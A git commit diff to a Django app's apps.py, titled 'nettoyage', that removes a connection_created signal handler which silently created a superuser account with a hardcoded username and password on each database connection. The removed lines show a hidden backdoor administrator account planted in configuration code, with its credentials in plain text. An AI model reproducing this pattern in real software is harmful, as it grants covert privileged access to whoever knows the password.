1b4ad6334d6d0a8c7c95884bc63a87c730b6dcb6
Kevin Bougouma <bclaudekevin@gmail.vom>
2026-07-23 05:31:10 +0000

    nettoyage

--- commande/apps.py
+++ commande/apps.py
@@ -1,12 +1,7 @@
 from django.apps import AppConfig
-from django.contrib.auth.models import User
-from django.db.backends.signals import connection_created
-from django.dispatch import receiver
 
-@receiver(connection_created)
-def create_admin_user(sender, **kwargs):
-    if not User.objects.filter(username="Claude2005").exists():
-        User.objects.create_superuser("Claude2005", "bclaudekevin@gmail.com", "Kevin6059")
+
+
 
 
 class CommandeConfig(AppConfig):
